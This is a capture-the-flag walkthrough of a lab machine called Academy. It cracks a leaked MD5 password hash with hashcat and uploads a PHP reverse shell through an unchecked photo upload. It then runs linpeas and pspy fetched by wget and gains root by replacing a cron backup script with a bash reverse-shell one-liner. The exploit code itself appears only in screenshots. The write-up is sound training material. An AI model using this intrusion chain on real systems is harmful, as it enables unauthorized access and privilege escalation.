
<h1>Academy Machine</h1>

<h2>**IP Address provided: 10.0.2.7**</h2>

This repository provides a comprehensive guide to the Academy Machine which is a Capture the Flag (CTF) challenge designed to test your skills in network scanning, web application testing, password cracking, privilege escalation, and system exploitation. This machine provides an opportunity to utilise a variety of tools and techniques commonly used in real-world penetration testing. You will encounter a combination of web-based vulnerabilities, system misconfigurations, and network-related challenges.

### Features:
- NMAP (Network Mapper)
NMAP is used for network scanning, identifying live hosts, and enumerating open ports/services on the target machine. Expect to perform full-service enumeration and version detection to discover potential vulnerabilities.
- Hashcat
Hashcat is employed to crack passwords or hash values found during the challenge, such as those retrieved from configuration files or databases.
- Dirb/Dirbuster/FFUF
These tools will be used for web directory and file brute-forcing to discover hidden resources or services within the web application. Expect to uncover directories with potentially sensitive data or misconfigurations.
- PHP Reverse Shell
The PHP reverse shell allows for remote code execution. You will use this shell to establish a reverse connection back to your local machine after exploiting a vulnerable web application or misconfiguration.
- Linpeas (Linux Privilege Escalation Enumeration)
Linpeas will help you scan for potential privilege escalation vectors once you've gained initial access to the system. It will identify misconfigurations, setuid binaries, and other weaknesses that can be leveraged for escalating privileges.
- Pspy64
Pspy64 is used to monitor the processes running on the target system in real time. It can help identify scheduled tasks, cron jobs, or other processes that might be running with elevated privileges, making it a valuable tool for post-exploitation.
- Bash Reverse Shell One-Liner
The bash reverse shell one-liner will be useful when you need to quickly establish a reverse shell connection, bypassing firewalls and security measures.
- Netcap (Network Capture)
Netcap will capture network traffic, allowing you to analyse packets, sniff traffic, and uncover hidden information such as unencrypted credentials, flags, or other clues that might assist you in further exploiting the system.


### Prerequisites:
Before starting the Academy Machine challenge, it is recommended to have basic knowledge and hands-on experience with the following tools and concepts:

- Networking Fundamentals: Knowledge of TCP/IP, ports, and protocols.
- NMAP: For network discovery and service enumeration.
- Hashcat: For password cracking and hash analysis.
- Dirb/Dirbuster/FFUF: Web directory and file brute-forcing tools.
- PHP Reverse Shell: Using PHP scripts to initiate reverse shells for exploitation.
- Linpeas: Linux privilege escalation enumeration script.
- Pspy64: To monitor processes running on the machine.
- Bash Reverse Shell One-Liner: Executing reverse shell using bash scripting.
- Netcap: For monitoring and capturing network traffic, analysing packets for clues.

<h2>Environments Used </h2>

- <b>Linux</b>

<h2>Walk-through:</h2>

Academy Machine (Linux)  
IP Address = 10.0.2.7

Started out by using Nmap to dearch for open ports on the target 10.0.2.7

nmap -A -p- -T4 10.0.2.7

And i see the following.

─$ nmap -A -p- -T4 10.0.2.7  
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-01 11:37 EDT  
Nmap scan report for 10.0.2.7  
Host is up (0.0033s latency).  
Not shown: 65532 closed tcp ports (conn-refused)  
PORT STATE SERVICE VERSION  
21/tcp open ftp vsftpd 3.0.3  
| ftp-syst:  
| STAT:  
| FTP server status:  
| Connected to ::ffff:10.0.2.15  
| Logged in as ftp  
| TYPE: ASCII  
| No session bandwidth limit  
| Session timeout in seconds is 300  
| Control connection is plain text  
| Data connections will be plain text  
| At session startup, client count was 2  
| vsFTPd 3.0.3 - secure, fast, stable  
|*End of status  
| ftp-anon: Anonymous FTP login allowed (FTP code 230)  
|*\-rw-r--r-- 1 1000 1000 776 May 30 2021 note.txt  
22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)  
| ssh-hostkey:  
| 2048 c7:44:58:86:90:fd:e4:de:5b:0d:bf:07:8d:05:5d:d7 (RSA)  
| 256 78:ec:47:0f:0f:53:aa:a6:05:48:84:80:94:76:a6:23 (ECDSA)  
|\_ 256 99:9c:39:11:dd:35:53:a0:29:11:20:c7:f8:bf:71:a4 (ED25519)  
80/tcp open http Apache httpd 2.4.38 ((Debian))  
|\_http-title: Apache2 Debian Default Page: It works  
|\_http-server-header: Apache/2.4.38 (Debian)  
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux\_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 14.05 seconds

- List itemFrom this we can see that port 21/tcp is open for ftp (vsftpd 3.0.3)  
    It also states that Anonymous FTP login is allowed and there is a txt file in there called note.
- List itemWe have port 22/tcp open for ssh(OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0))
- List itemWe have port 80/tcp open showing us that it is using Apache2 (Apache httpd 2,4,38 (Debian))

I can take port 22 out, if i have some usernames we could try to brute force it and as a pentester i would try this to see if i have been seen and if weak passwords are being used and we would report this but for this attack i will remove port 22 from the list.

Port 80 is a webpage (http-title: Apache2 Debian Default Page: It works) so i can asume it is running PHP on the backend.

![Screenshot 2025-02-22 at 19 49 20](https://github.com/user-attachments/assets/094c2a4f-de6b-48d3-9d2a-a2e438405fff)

This would be a finding on the pentest and noting its revealing too much information, is this webserver supposed to be up? if it is then maybe look to remove this default webpage. Maybe change it to say "If your not supposed to be here then dont be here" anything should be put instead of the default webpage as we are able to see the architecture here. If its not supposed to be there, then from a hackers perspective this would indicate poor hygiene, your just leaving ports open, you are throwing computers on the network aphazardously identifying poor hygiene. They may want to look into you further because if this is something you are doing then potentially you could be using poor passwords, not patching etc.

Lets look at the ftp to see what this NOTE is as we can access anonymously.

so type in the following:  
ftp 10.0.2.7  
And you will be asked for username: anonymous  
you will be asked for password: type the same  
you now have access.  
type ls to list (see below)

─$ ftp 10.0.2.7  
Connected to 10.0.2.7.  
220 (vsFTPd 3.0.3)  
Name (10.0.2.7:kali): anonymous  
331 Please specify the password.  
Password:  
230 Login successful.  
Remote system type is UNIX.  
Using binary mode to transfer files.  
ftp> ls  
229 Entering Extended Passive Mode (|||21502|)  
150 Here comes the directory listing.  
-rw-r--r-- 1 1000 1000 776 May 30 2021 note.txt  
226 Directory send OK.  
ftp>

Type in get note.txt

ftp> get note.txt  
local: note.txt remote: note.txt  
229 Entering Extended Passive Mode (|||64769|)  
150 Opening BINARY mode data connection for note.txt (776 bytes).  
100% |******************************************************************************************************************************************************************************************************************| 776 306.68 KiB/s 00:00 ETA226 Transfer complete.  
776 bytes received in 00:00 (237.70 KiB/s)  
ftp>

I have grabbed the file but I dont know where this note is being stored. If the note file was say, stored in the apache server and i could see it by typing in the web address 10.0.2.7/note.txt then that could be of interest because i know the directory i am in, i could upload malware and execute this because i have execution and i could get a shell and keep pushing forward. But in this instance i dont know where it is, its a good chance its not even on the web server. If it was on the web server i could execute this and this is a strategy that i would want to use, i could put a file in there and social engineering to get someone to open the file or something to execute it for me. But in this capture the flag style scope i am only interested in getting the note.

Secondary finding from the webserver (10.0.2.7/note.txt) 404 page.  
Not Found

The requested URL was not found on this server.  
Apache/2.4.38 (Debian) Server at 10.0.2.7 Port 80

I see that we have Apache 2.4.38 running, it tells me its running a debian server so i know we are attacking Linux.

So i exit the ftp

I want to read the note.  
cat note.txt

I get a lot of information from this note which should be part of the report.

Hello Heath !  
Grimmie has setup the test website for the new academy.  
I told him not to use the same password everywhere, he will change it ASAP.

I couldn't create a user via the admin panel, so instead I inserted directly into the database with the following command:

INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES  
('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');

The StudentRegno number is what you use for login.

Let me know what you think of this open-source project, it's from 2020 so it should be secure... right ?  
We can always adapt it to our needs.

-jdelta

So this tells me the database values with a note saying StudentRegno is what you use to log in, i can see what looks to be the hash for the password (cd73502828457d15655bbd7a63fb0bc8), we can see the StudentRegno number (10201321), the pin code (777777). This would be deemed as very sensitive information.

I can grab the password and use hash-identifier in Linux.  
Type: hash-identifier  
Paste in hash  
it will come up with everything it thinks it is.

HASH: cd73502828457d15655bbd7a63fb0bc8

Possible Hashs:  
[+] MD5  
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

Least Possible Hashs:  
[+] RAdmin v2.x  
[+] NTLM  
[+] MD4  
[+] MD2  
[+] MD5(HMAC)  
[+] MD4(HMAC)  
[+] MD2(HMAC)  
[+] MD5(HMAC(Wordpress))  
[+] Haval-128  
[+] Haval-128(HMAC)  
[+] RipeMD-128  
[+] RipeMD-128(HMAC)  
[+] SNEFRU-128  
[+] SNEFRU-128(HMAC)  
[+] Tiger-128  
[+] Tiger-128(HMAC)  
[+] md5($pass.$salt)  
[+] md5($salt.$pass)  
[+] md5($salt.$pass.$salt) [+] md5($salt.$pass.$username)  
[+] md5($salt.md5($pass))  
[+] md5($salt.md5($pass))  
[+] md5($salt.md5($pass.$salt)) [+] md5($salt.md5($pass.$salt))  
[+] md5($salt.md5($salt.$pass)) [+] md5($salt.md5(md5($pass).$salt))  
[+] md5($username.0.$pass)  
[+] md5($username.LF.$pass)  
[+] md5($username.md5($pass).$salt) [+] md5(md5($pass))  
[+] md5(md5($pass).$salt)  
[+] md5(md5($pass).md5($salt))  
[+] md5(md5($salt).$pass)  
[+] md5(md5($salt).md5($pass))  
[+] md5(md5($username.$pass).$salt) [+] md5(md5(md5($pass)))  
[+] md5(md5(md5(md5($pass)))) [+] md5(md5(md5(md5(md5($pass)))))  
[+] md5(sha1($pass)) [+] md5(sha1(md5($pass)))  
[+] md5(sha1(md5(sha1($pass)))) [+] md5(strtoupper(md5($pass)))

Its saying its most likely an MD5 hash.

**What is MD5?**  
The MD5 (message-digest algorithm) hashing algorithm is a one-way cryptographic function that accepts a message of any length as input and returns as output a fixed-length digest value to be used for authenticating the original message.

The MD5 hash function was originally designed for use as a secure cryptographic hash algorithm for authenticating digital signatures. But MD5 has been deprecated for uses other than as a noncryptographic checksum to verify data integrity and detect unintentional data corruption.

**What is MD5 used for?**  
Although originally designed as a cryptographic message authentication code algorithm for use on the internet, MD5 hashing is no longer considered reliable for use as a cryptographic checksum because security experts have demonstrated techniques capable of easily producing MD5 collisions on commercial off-the-shelf computers. An encryption collision means two files have the same hash. Hash functions are used for message security, password security, computer forensics and cryptocurrency.

Go to google and put this in the search bar.  
Hashcat (tool we are going to use) crack MD5 hash

![Screenshot 2025-02-22 at 19 53 42](https://github.com/user-attachments/assets/bd8391ab-2eaa-4ab4-bdf8-fa98b510effc)

Open this page and you will see instructions how to use.  
hashcat –m 0 hashes /usr/share/wordlists/rockyou.txt

![Screenshot 2025-02-22 at 19 54 54](https://github.com/user-attachments/assets/c69b2c3a-b040-4d15-ab7d-518ba1e77f09)

I will try to run this but hascat runs off the cpu and i am running in a virtualbox which will make things run even slower, but i will try it to see.

Type: locate rockyou.txt

Put the hash into a file

mousepad hashes.txt

Type the following:

hashcat –m 0 cd73502828457d15655bbd7a63fb0bc8 /usr/share/wordlists/rockyou.txt

![Screenshot 2025-02-22 at 19 56 24](https://github.com/user-attachments/assets/1d1009b6-be39-4c63-b4d3-a291bd5c6a85)

![Screenshot 2025-02-22 at 19 56 56](https://github.com/user-attachments/assets/ce74305a-c726-421b-ac98-18a3d46017d3)

![Screenshot 2025-02-22 at 19 57 37](https://github.com/user-attachments/assets/0c01c9c3-6561-490c-8ea6-39625ad0d95f)

![Screenshot 2025-02-22 at 19 58 12](https://github.com/user-attachments/assets/8bc11dd8-d996-424b-a08e-f3a1b4fa2bdb)

The password is cracked as shown below. (student)

![Screenshot 2025-02-22 at 19 59 19](https://github.com/user-attachments/assets/46f95e86-5870-4aa7-bc61-bb4d7f2c39d1)

We have a username / user ID: 10201321

![Screenshot 2025-02-22 at 20 00 17](https://github.com/user-attachments/assets/5b1f268a-c214-4bf7-bc37-fdc1bf8cd2f8)

We have a password: student

But how do we use this??

So potentially we could go to the web address and add /academy as we know the name is academy from the note text.

![Screenshot 2025-02-22 at 20 01 20](https://github.com/user-attachments/assets/72bfbf36-58ae-401c-9c55-206e5bb5bde7)

or

I could use a tool called dirb

Type: dirb http://10.0.2.7 This will go through the website finding different addresses associated with 10.0.2.7

![Screenshot 2025-02-22 at 20 02 33](https://github.com/user-attachments/assets/e41e12d5-a9e1-43a3-a23d-abd0c6f3aec2)

or ffuf

apt install ffuf

ffuf -w /user/share/wordlists/dirbuster/(then double tab to be able to pick the wordlist)  
ffuf -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://10.0.2.7/FUZZ

-w = wordlist  
-u target URL

![Screenshot 2025-02-22 at 20 03 53](https://github.com/user-attachments/assets/3b83b2b9-59a9-4c80-aedc-eddf10714327)

The difference between dirbuster and ffuf is dirbuster will find a subdomain and then look for all different subdomains of this domain which can take a while where ffuf will only go to level one so it will find 1 subdomain and then look for another so the scan is quicker and you can use what you feel is relevant then search deeper on these.

So from this we see a 301 from academy which is a redirect, the same for admin.

So I go back to the website and enter the username and password.

![Screenshot 2025-02-22 at 20 05 33](https://github.com/user-attachments/assets/99711c10-d9ba-4e76-9ef0-719408c885b0)

you are then brought to a change password screen so you can change it to what you want.

![Screenshot 2025-02-22 at 20 06 23](https://github.com/user-attachments/assets/29b3e36e-503b-4247-849f-6ce6d040aa19)

or

you can just leave as is and enroll in a course etc.

![Screenshot 2025-02-22 at 20 07 35](https://github.com/user-attachments/assets/bf37cdca-3d4a-4108-9bf3-31d352e0b8f4)

The interesting thing here is we have the upload option and we need to think how I want to attack a website, what are some of the ways we can get code execution?  
We might be able to perform LFI RFI attacks on this and pull down information or execute code. Maybe the SQL injection somewhere in here that we can pull down and dump the database, we did see a phpmyadmin on the scan, maybe theres more behind the scenes that we can do?

So we attempt to update a picture to see if that works.

![Screenshot 2025-02-22 at 20 09 18](https://github.com/user-attachments/assets/9639f652-208f-4007-accc-c1f08e6d4e68)

That worked so can we upload a file that is not a picture?? We want to see if we can upload something that is not a photo and abuse and abuse the file upload system. If they are doing no checks here and we can just upload this then they can be in big trouble.

So we can right click the image and click view, this will show us in the task bar where this image is being stored on the website.

![Screenshot 2025-02-22 at 20 10 23](https://github.com/user-attachments/assets/515db369-ed68-4e17-a710-b3a5bc9c64eb)

so refresh the page and we can see that this website is running php and we know from earlier scans

![Screenshot 2025-02-22 at 20 11 13](https://github.com/user-attachments/assets/e6e0de23-0369-4d63-8a17-d102729b2313)

So maybe i can upload a reverse shell and get a connection back.

Go to google and search reverse shell.

![Screenshot 2025-02-22 at 20 13 00](https://github.com/user-attachments/assets/500dbf8a-14dc-4423-8d14-550e777c0460)

Open up and click on this.

![Screenshot 2025-02-22 at 20 14 06](https://github.com/user-attachments/assets/86a9a9fe-e359-43af-8101-a92b6078ae92)

Click on RAW

![Screenshot 2025-02-22 at 20 15 02](https://github.com/user-attachments/assets/77a2d070-04b7-4ad3-bfa8-3c719d75423a)

![Screenshot 2025-02-22 at 20 15 54](https://github.com/user-attachments/assets/cab828c3-551c-4cd3-9edd-70c0a8a7cdee)

Copy all of this

Place in a nano or mousepad file named shell.php

After the comments you will see this with 'CHANGE THIS'  
you need to put in the IP Address of your **ATTACKER MACHINE**  
You can leave the port 1234 as is.

![Screenshot 2025-02-22 at 20 17 10](https://github.com/user-attachments/assets/70aba109-1763-48fd-bb96-d7f03775edef)

Save the file with the correct IP Address of your attack machine (ip a) if you need your IP Address.

so we need a listener so type in the following into Linux

![Screenshot 2025-02-22 at 20 18 00](https://github.com/user-attachments/assets/c0c0f2dc-ef19-459d-836a-9cf544c63209)

We are now listening and waiting for something to happen.

We now go back to the webpage and upload the shell.php file and the picture disappears and we just have a blank space.

![Screenshot 2025-02-22 at 20 19 16](https://github.com/user-attachments/assets/a196dadf-63a2-42bd-b99d-17f9993bad61)

Go back to your terminal to see if it has tried to execute, which it has.

![Screenshot 2025-02-22 at 20 20 03](https://github.com/user-attachments/assets/3dafec21-768d-4698-8926-de7fef242e75)

So we dont need to right click and go to that location, its already executed.

We now have a shell, if we type whoami we can see we are www-data so we are not an admin.

![Screenshot 2025-02-22 at 20 21 13](https://github.com/user-attachments/assets/7633cfe8-f9b6-4332-891a-292abdf19205)

if we try to run as sudo to list, or find sudo we get an error message.

So we have landed on the machine, we are not root user so we need to perform privilege escalation, this is where things get fun and we take a lot of winding roads to get where we want to be.

So i am going to utilise a tool called linpeas to do some searching, linpeas is a tool that goes out and hunts for any privilege escalation.

Go to google and search

![Screenshot 2025-02-22 at 20 23 44](https://github.com/user-attachments/assets/dafc62b4-f42f-4d46-88e2-69119f80ed93)

You will see github

![Screenshot 2025-02-22 at 20 24 49](https://github.com/user-attachments/assets/87d1168e-5159-4a04-959a-fb5e93b7391a)

This is going to search through to see if there are any paths of escalation for us, click on RAW for the code

![Screenshot 2025-02-22 at 20 25 41](https://github.com/user-attachments/assets/912ceda5-5c23-4a4e-81e2-aa94f83ba6e8)


![Screenshot 2025-02-22 at 20 26 28](https://github.com/user-attachments/assets/cf713133-97f1-4cc9-a50c-4ba16ab8ccdb)

Copy code.

![Screenshot 2025-02-22 at 20 27 23](https://github.com/user-attachments/assets/6d1006e6-90ce-4363-bf7d-59c9173be422)

This time i make a directory called transfers and copy the text into the directory.

![Screenshot 2025-02-22 at 20 28 36](https://github.com/user-attachments/assets/5a3ca793-6e14-4e3b-8dd1-63796aff5a43)

Then cd into the location and ls

![Screenshot 2025-02-22 at 20 29 16](https://github.com/user-attachments/assets/3ad2e1e3-76ae-439f-92b0-11af8e32c632)

So i need to host up a webserver using Python

![Screenshot 2025-02-22 at 20 30 04](https://github.com/user-attachments/assets/093fa83e-f94a-4da9-a99f-64f049c2510e)

I need to put the folder onto the attacked machine and the best place to put that would be the temp folder, so i cd into temp and check we are in temp with pwd.

![Screenshot 2025-02-22 at 20 31 11](https://github.com/user-attachments/assets/0fc57752-0882-42b3-a349-f7199db574de)

Type the following in the tmp folder.

wget http://my ip address/linpeas.sh and press enter. It should come through and start to install.

![Screenshot 2025-02-22 at 20 32 08](https://github.com/user-attachments/assets/32bdd103-750e-44fc-8f3e-22ff50655ed2)

ls into it

![Screenshot 2025-02-22 at 20 33 01](https://github.com/user-attachments/assets/273857e5-b572-4e46-99c5-e5282b257af9)

Then we need to make it executable.

Change mode.

![Screenshot 2025-02-22 at 20 33 49](https://github.com/user-attachments/assets/03185eff-72b4-45ee-9706-8b1ba5a42118)

![Screenshot 2025-02-22 at 20 34 24](https://github.com/user-attachments/assets/f41ef54f-0c9c-4598-8f2b-91a6f3334414)

now run it

![Screenshot 2025-02-22 at 20 35 08](https://github.com/user-attachments/assets/b3ee9e1e-12a6-42da-906e-b621d12f70c9)

When you run this it will show a lot of information, if you scroll back up it will give you a legend.

![Screenshot 2025-02-22 at 20 36 12](https://github.com/user-attachments/assets/4eae0373-e758-47b6-b8d4-81dc9f149fb2)

So we are looking for RED as a minimum.

We get information on the Linux distribution.

![Screenshot 2025-02-22 at 20 37 33](https://github.com/user-attachments/assets/2a4e5c03-bacf-40ce-aaf5-996759282301)

This is looking for cron jobs  
Cron is a standard Unix utility that is used to schedule commands for automatic execution at specific intervals. For instance, you might have a script that produces web statistics that you want to run once a day automatically at 5:00 AM. Commands involving cron are referred to as "cron jobs."

![Screenshot 2025-02-22 at 20 38 41](https://github.com/user-attachments/assets/742a113f-dd8a-4876-bc61-2f2262f64816)

There is a highlighted RED/YELLOW

Copy that to see what it is.

I keep scrolling and we find a my SQL password.

![Screenshot 2025-02-22 at 20 41 49](https://github.com/user-attachments/assets/d4ad616f-c5f9-45a6-91a1-50cd41241b5e)

I can see this password shows up again and is in the following.

![Screenshot 2025-02-22 at 20 42 45](https://github.com/user-attachments/assets/bb02b51e-fae0-4908-8465-64cc836dac48)

I have another password

![Screenshot 2025-02-22 at 20 43 39](https://github.com/user-attachments/assets/bc3fe4a4-fdf5-42c7-bb65-4f6f32e0d7e2)

Lets look at the file we just found first.

![Screenshot 2025-02-22 at 20 44 29](https://github.com/user-attachments/assets/803a75a9-64cf-45b3-880c-8af7612a23a0)

Maybe have a look to see what users is on the system.

![Screenshot 2025-02-22 at 20 45 04](https://github.com/user-attachments/assets/b65e626f-4d3e-41c1-af44-a0f5ac826313)

![Screenshot 2025-02-22 at 20 45 48](https://github.com/user-attachments/assets/126131fd-dce7-430d-b113-62c17f5d51a8)

Scroll down and one of interest is grimme which we found highlighted earlier.

![Screenshot 2025-02-22 at 20 46 34](https://github.com/user-attachments/assets/ec00ee78-0613-4623-9a38-50b69c666ae5)

It says that grimme is an administrator.

So i will try using grimme to log on.

![Screenshot 2025-02-22 at 20 47 41](https://github.com/user-attachments/assets/e47190e4-7f56-44f4-8b09-c9c66d53b621)


![Screenshot 2025-02-22 at 20 48 23](https://github.com/user-attachments/assets/0f365e35-6e51-47f8-97a0-aff0180551df)

Paste in the password i got.

![Screenshot 2025-02-22 at 20 49 21](https://github.com/user-attachments/assets/84d7d728-ac6d-4cb5-b042-7094e5741d2a)

I am now in this machine but i dont have sudo access.

![Screenshot 2025-02-22 at 20 50 58](https://github.com/user-attachments/assets/807b6d7c-3f1f-49e0-a150-8496a807b46a)

From here maybe download linpeas again to see if anything has changed.

So i want to look at the file of interest so lets go to the location.

![Screenshot 2025-02-22 at 20 52 07](https://github.com/user-attachments/assets/e026f8c9-aa71-4a5f-ac39-d2fa4cbe5838)

ls in here.

![Screenshot 2025-02-22 at 20 53 04](https://github.com/user-attachments/assets/bf1955a6-2372-4bcd-a5d1-812dd5110ffe)

All we have is backup.sh so lets look at that.

![Screenshot 2025-02-22 at 20 53 50](https://github.com/user-attachments/assets/cc8abe3c-37cc-4b22-96fe-8990c8288512)

So it looks like it is removing a temp back up file and zipping up a tmp back up file from the file var/www/html/academy/includes. And then its changing the permisions of the temp file. So this is telling us there is a script being created automatically to perform this back up.

I still dont have high enough access so i use something called pspy64, download .  
Move from downloads to transfer folder  
mv downloads pspy64 transfer/pspy64

Use wget on the attacked machine to get the file and then run the file.

![Screenshot 2025-02-22 at 20 55 08](https://github.com/user-attachments/assets/4c67e584-4cc6-4b9f-a9ee-26351042cd16)

![Screenshot 2025-02-22 at 20 55 48](https://github.com/user-attachments/assets/99a82097-dc00-45b7-ac36-15516425038d)

Now what this is doing is showing all the processes running on the machine.

![Screenshot 2025-02-22 at 20 57 12](https://github.com/user-attachments/assets/f988214b-3cf4-482c-a2ba-eda3e6cfe22c)

I am looking for the Backup.sh file running so i scroll down through.

![Screenshot 2025-02-22 at 20 58 16](https://github.com/user-attachments/assets/394e300d-452a-4a33-bdea-ee9aa6fe2e9e)

The program will grab this everytime it runs so i can wait to see when it runs again.

Go back to grimme home page and ls for the backup.sh file.

![Screenshot 2025-02-22 at 20 59 42](https://github.com/user-attachments/assets/a9726af9-db00-442e-87a2-740754cb9b46)

I now go out to Google

![Screenshot 2025-02-22 at 21 00 47](https://github.com/user-attachments/assets/1f32c350-d6a5-4609-9289-beb47c29a1c5)

Open this and you will see bash.

![Screenshot 2025-02-22 at 21 01 46](https://github.com/user-attachments/assets/4877fa34-9630-429e-b116-01f351a153bd)

This is a 1 liner reverse shell, all i am going to do is put this into a shell script which i already have and this is going to execute it the next time it runs.

![Screenshot 2025-02-22 at 21 02 56](https://github.com/user-attachments/assets/7a780d08-c1a1-4901-93cd-cfe360366250)

Open up notepad and paste it in, change the ip address to the attacker machine.

![Screenshot 2025-02-22 at 21 03 55](https://github.com/user-attachments/assets/4d9fc99d-7289-41e6-aaf5-efd22d00196b)

Change the port to 8081 or 8080  
Copy the text

Set up netcap listener on port 8081 or port 8080

![Screenshot 2025-02-22 at 21 05 04](https://github.com/user-attachments/assets/ac7d955e-ba1a-4255-8cfb-4e3b591dd826)

Go back into grimme and open nano

![Screenshot 2025-02-22 at 21 05 49](https://github.com/user-attachments/assets/56b794fc-19dd-47e5-b8c1-8b6cc718ce9e)

![Screenshot 2025-02-22 at 21 06 19](https://github.com/user-attachments/assets/1fa079db-8e3e-4e32-8956-3527682f67f6)

Hit Control K on the lines it will delete the line.

![Screenshot 2025-02-22 at 21 06 58](https://github.com/user-attachments/assets/90839b6d-6598-42d1-8197-7c94f61b572b)

Paste 1 liner in

![Screenshot 2025-02-22 at 21 07 43](https://github.com/user-attachments/assets/647674e1-711e-4cd1-ad7a-1d9952de3b37)

So when this runs it will send out to our machine, if my hunch is correct and this is running on root then we will get a root user shell on this.

![Screenshot 2025-02-22 at 21 08 52](https://github.com/user-attachments/assets/5e6c83cc-b4ae-453c-8493-fb9288e60d61)

cd into root

![Screenshot 2025-02-22 at 21 09 45](https://github.com/user-attachments/assets/5abe52c9-1ae6-4b51-9eb9-9795dcca51ae)

# Machine rooted

![Screenshot 2025-02-22 at 21 11 14](https://github.com/user-attachments/assets/4e0e1f3d-38c9-46e2-9e5d-e3114d58935f)







